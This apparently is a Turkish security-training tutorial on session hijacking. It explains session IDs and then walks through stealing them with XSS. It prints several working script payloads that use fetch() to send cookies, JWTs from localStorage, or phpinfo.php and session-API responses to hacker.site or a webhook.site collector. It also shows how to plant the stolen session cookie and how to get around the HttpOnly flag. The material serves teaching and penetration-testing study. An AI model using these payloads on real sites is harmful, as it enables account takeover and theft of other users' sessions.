Oturum ele geçirme saldırısı, bir uygulamadaki kullanıcı adı ve parolayı bilmeden kullanıcı hesabı erişimini ele geçirmeyi ifade etmektedir. Bir kullanıcı bir uygulamada oturum açtığında, kimlik bilgilerini sürekli girmek zorunda kalmadan belirli bir süre boyunca doğrulanmış olarak kalır. Bu, sunucunun kullanıcı için aktif bir oturum sürdürmesi sayesinde mümkün olmaktadır.

### Oturum Kimliği Nedir?

Sunucu, bu oturumu başlatmak için kullanıcıya genellikle bir **session cookie** (oturum çerezi) veya **bearer token** (taşıyıcı token) şeklinde benzersiz bir ID (kimlik) verir. Kullanıcı uygulamada işlemler gerçekleştirdiğinde, bu ID tarayıcıda saklanır ve sunucunun ilgili oturumu tanıması ve doğrulaması için sunucuya giden tüm isteklerin içerisinde iletilir. Bu ID, güvenlik açısından büyük bir öneme sahiptir çünkü bir kullanıcının oturumunu doğrulamasını ve uygulamanın işlevlerine erişimini sağlar. Yani, bu ID, kullanıcının kimlik bilgilerini sağlamasına gerek kalmadan onu doğrular.

Oturum Kimliği Türleri

Bu değerler, genellikle rastgele oluşturulan benzersiz tanımlayıcılardır ve kullanıcıların oturumlarını güvenli bir şekilde yönetmek için kullanılır. Oturum kimlikleri, web tarayıcısında çerezler (cookies) aracılığıyla saklanabilir ve her istekte sunucuya gönderilir, böylece sunucu, kullanıcıyı tanıyabilir ve kullanıcıya özgü bilgileri sunabilir.

Bu değerlere tarayıcının geliştirici seçenekleri (F12) içerisinde bulunan

Application (Uygulama) > Cookies (Çerezler)

ya da

Storage (Depolama) > Cookies (Çerezler)

kısmından erişilebilmektedir.

1. **PHP Oturum Değişkeni:**
    
    - İsim: 
        
        PHPSESSID
        
    - Değer: 
        
        e3r4p17o32f4qe7s5toc2fc677
        
2. **ASP.NET Oturum Değişkeni:**
    
    - İsim: 
        
        ASP.NET_SessionId
        
    - Değer: 
        
        tgx4p455zv0d0a55p4n3v055
        
3. **Java Servlet Oturum Değişkeni:**
    
    - İsim: 
        
        JSESSIONID
        
    - Değer: 
        
        abcde12345ABCDE12345ABCDE1234567
        
4. **Ruby on Rails Oturum Değişkeni:**
    
    - İsim: 
        
        _rails_session
        
    - Değer: 
        
        B3D9D1A37E3569012D9115F53A8B428C
        
5. **Express.js (Node.js) Oturum Değişkeni:**
    
    - İsim: 
        
        connect.sid
        
    - Değer: 
        
        s%3A37RQhDE4f501Px2-OpCRGKJjv8CLN8Ss.%2B5PV%2B2C1
        
6. **JWT (JSON Web Token):**
    
    - İsim: 
        
        Authorization
        
    - Değer: 
        
        Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
        

### En Yaygın Oturum Ele Geçirme Saldırıları

- **XSS (Cross-Site Scripting)**: XSS zafiyeti tarayıcıda bulunan oturum kimliklerinin (session, token, JWT) ele geçirilmesine neden olabilmektedir. Bu oturum kimlikleri kullanıcıların oturumunu ele geçirmek için yeterli olabilmektedir.
    
- **Oturum Sabitleme (Session Fixation)**: Oturum kimliği, kaba kuvvet saldırıları ile tahmin edilemeyecek kadar karmaşık olmalıdır. Bulunabilir oturum kimlikleri oturumun ele geçirilmesine neden olabilir.
    
- **MFA (Çok Faktörlü Kimlik Doğrulama) Aşılması**: Çok faktörlü kimlik doğrulama, kullanıcı giriş yaptığında ikinci (veya daha fazla) bir kimlik doğrulama faktörü gerektirir. Bu, örneğin SMS veya e-posta ile gönderilen bir kod olabilir. Bu mekanizma, bir saldırganın yalnızca şifreye dayanarak bir kullanıcının hesabını ele geçirmesini önlemek için kullanılır. Oturum kimliği ele geçirildiğinde bu doğrulama aşamalarının her biri daha önceden zaten tamamlanmış olduğu için oturuma direkt olarak erişimi mümkün kılmaktadır.
    
- **TLS Şifrelemesinin Eksikliği**: Sunucu şifreleme uygulamadığında (HTTP yerine HTTPS kullanılmadığında), kullanıcı ile web platformu arasındaki iletişim şifrelenmeden, açık metin olarak iletilir. Bu durum, ağ üzerinde dinleme yapan bir saldırganın bu iletişimleri yakalamasına ve dolayısıyla kullanıcıların oturum kimliklerini toplamasına olanak tanır.
    

### XSS Zafiyeti ile Oturum Ele Geçirme Saldırısı

XSS saldırıları, kullanıcının tarayıcısında yürütülen JavaScript kodlarını kullanarak gerçekleştirilir. Kötü niyetli bir script, tarayıcıda saklanan oturum çerezlerini veya oturum tokenlarını ele geçirebilir. Bu bilgiler, kullanıcının kimliğini doğrulamak ve web uygulamasında oturum açık tutmak için kullanıldığından, ele geçirilmesi hesap devralma (account takeover) saldırılarına neden olabilmektedir.

- **Çerezleri Çalmak:**

```auto
<script>fetch("https://hacker.site?data=" + document.cookie);</script>
```

Bu script, kullanıcının çerezlerini, içinde oturum çerezleri de dahil olmak üzere, bir HTTP GET isteği aracılığıyla kötü niyetli bir web sitesi ya da dinleme yapan bir sunucuya gönderir. Saldırgan, bu çerezleri kullanarak kullanıcının oturumunu ele geçirebilir.

- **JWT Token Çalmak:**

```auto
<script>fetch("https://hacker.site?data=" + localStorage.getItem('JWT'));</script>
```

Modern web uygulamalarında, JSON Web Token (JWT) gibi oturum tokenları sıklıkla kullanılır ve bu tokenlar genellikle yerel depolamada (

localStorage

veya

sessionStorage

) saklanır. Bu script, kullanıcının JWT'sini çalarak kötü niyetli bir web sitesi ya da dinleme yapan bir sunucuya gönderir.

Uygulama

![](https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/efd9d5ea-dad1-4499-bde8-21b87814d9fb/webhook-home-9899465d0.webp)

Çalınan oturum kimliğini saklamak ve görüntülemek için bir web sunucusuna ihtiyaç duyulmaktadır. Bu işlem HTTP isteklerini yakalama işlevi gören web siteleri ile kolay bir şekilde gerçekleştirilebilmektedir. Bu örnekte **webhook.site** sitesi kullanılacaktır. İnternet üzerinden ücretsiz bir şekilde erişime açık hizmet sunmaktadır. Bu ve buna benzer web siteleri gönderilen HTTP isteklerinin yakalayıp analiz edilmesini sağlayan bir hizmettir.

**Your unique URL** başlığı altında bulunan adres farklı methodlardaki HTTP istekleri yakalayacak olan adrestir. Bu adres, XSS payload'u içerisinde kullanılacaktır.

Alternatif olarak kullanılabilecek web siteleri:

- pipedream.com
- requestbin.myworkato.com

Ya da hedef ile doğrudan iletişime geçebilen, erişime açık bir sunucu üzerinde bir HTTP sunucusu başlatarak da bu işlem gerçekleştirilebilir. Örneğin python ile basit bir şekilde HTTP sunucusu oluşturulabilir ve gelen HTTP istekleri rahat bir şekilde görüntülenebilir.

**Not:** Eğer hedef sistemin internete erişimi yok ise yerel ağda python http sunucusu tercih edilebilir.

![](https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/efd9d5ea-dad1-4499-bde8-21b87814d9fb/python-server-0582583e1.webp)

```auto
python3 -m http.server 8080
```

![](https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/efd9d5ea-dad1-4499-bde8-21b87814d9fb/session-hijacking-payload-7a39c3b37.webp)

Bu aşamada XSS payload'u hazırlanmış olup içerisinde webhook adresi yazılmıştır. Payload tarayıcıda bulunan cookie bilgilerini

data

isimli GET parametresine atayarak

fetch

fonksiyonu ile belirtilen adrese HTTP isteği yaparak göndermektedir.

```auto
<script>fetch("https://webhook.site/ac2a452b-4f51-4762-82c5-6d0c6ecf6bdc?data=" + document.cookie);</script>
```

![](https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/efd9d5ea-dad1-4499-bde8-21b87814d9fb/session-hijacking-message-3ab5394c9.webp)

Payload gönderildikten sonra boş bir mesaj şeklinde mesajı okuyan tüm kullanıcılar tarafından görülebilmektedir. Mesajı gören her bir kullanıcının tarayıcısında bu JavaScript kodu çalıştığı için tüm kullanıcıların web sitesi üzerinde bulunan cookie bilgileri ele geçirilebilir.

![](https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/efd9d5ea-dad1-4499-bde8-21b87814d9fb/webhook-session-f5049237a.webp)

Webhook logları kontrol edildiğinde gelen bir istek görüntülenmiştir. Burada GET parametresinde

?data=PHPSESSID=50kkdorpjgqm5r2hvfgv400cj3

değeri bulunduğu görülmektedir. PHP dili ile yazılan web uygulamalarında kullanılan oturum kimliği olduğu belirlenebilmektedir.

![](https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/efd9d5ea-dad1-4499-bde8-21b87814d9fb/dev-tools-session-80babeece.webp)

Ele geçirilen oturum kimliği, tarayıcının geliştirici seçenekleri (F12) içerisinde

Application (Uygulama) > Cookies (Çerezler)

ya da

Storage (Depolama) > Cookies (Çerezler)

kısmından girilerek ya da yapılan HTTP isteklerinde bulunan

Cookie

değeri değiştirilerek başka bir kullanıcının oturumu ele geçirilebilir. Oturum kimliğini kullanarak sanki o kullanıcıymış gibi kullanıcının hesabı üzerindenişlem yapılabilmektedir.

Burada kullanılan örnekte Stored XSS zafiyeti bulunmakta, bu işlemler için XSS zafiyetinin türü önemli değildir. Başka kullanıcıların görüntüleyeceği bir şekilde olması yeterlidir. Örneğin Reflected XSS ya da DOM-based XSS zafiyeti için de bu durum geçerlidir.

```auto
https://example.com/home?search=<script>fetch("https://webhook.site/ac2a452b-4f51-4762-82c5-6d0c6ecf6bdc?data=" + document.cookie);</script>
```

Bu adresi ziyaret eden kullanıcıların oturum kimlikleri ele geçirilecektir.

### HTTPOnly Bayrağı ve Aşılma Yöntemleri

HttpOnly

çerez bayrağı, web uygulamalarının güvenlik mekanizmaları arasında önemli bir yer tutar. Bu bayrak, bir çerezin sadece HTTP üzerinden erişilebilir olmasını sağlayarak, bu çerezlerin JavaScript tarafından okunmasını önler. Bu özellik, özellikle XSS (Cross-Site Scripting) saldırılarına karşı bir savunma hattı olarak işlev görür çünkü JavaScript ile çerezlerin okunmasını engeller.

Ancak, güvenlikte hiçbir sistem mükemmel olmadığı gibi,

HttpOnly

bayrağının da bazı durumlarda aşılabileceği senaryolar mevcuttur. Bu senaryolar genellikle çerezlerin JavaScript'e maruz kalmadığı, ancak yine de saldırganın çerez içeriğine dolaylı yollarla erişebileceği durumları içerir.

HttpOnly Bayrağının Aşılması

1. phpinfo.php
    
     isimli dosya web sitesi üzerinde bulunabilirse, hedefin bu dosyayı ziyaret etmesini sağlayarak 
    
    HttpOnly
    
     bayrağına sahip oturum kimlikleri ele geçirilebilir.

```auto
<script>
  fetch("http://example.com/phpinfo.php", {credentials: "include"})
  .then(response => response.text())
  .then(data => {
    const base64Data = btoa(data);
    return fetch("http://hacker.site/?data=" + base64Data);
  })
</script>
```

2. Oturum kimliklerinin sayfa içerisinde bulunduğu bir adres ya da oturum kimliği döndüren bir API noktası mevcut ise hedefin bu adresi ziyaret etmesini sağlayarak ilgili veriler ele geçirilebilir.

```auto
<script>
  fetch("http://example.com/api/session", {credentials: "include"})
  .then(response => response.json())
  .then(data => {
    return fetch("http://hacker.site/?data=" + data.sessionId);
  })
</script>
```

3. Oturum kimlikleri 
    
    localStorage
    
     veya 
    
    sessionStorage
    
     içerisinde saklanıyorsa burada 
    
    HttpOnly
    
     bayrağı bulunmadığından dolayı buradan ilgili veriler ele geçirilebilir.

```auto
<script>fetch("https://hacker.site?data=" + localStorage.getItem('JWT'));</script>
```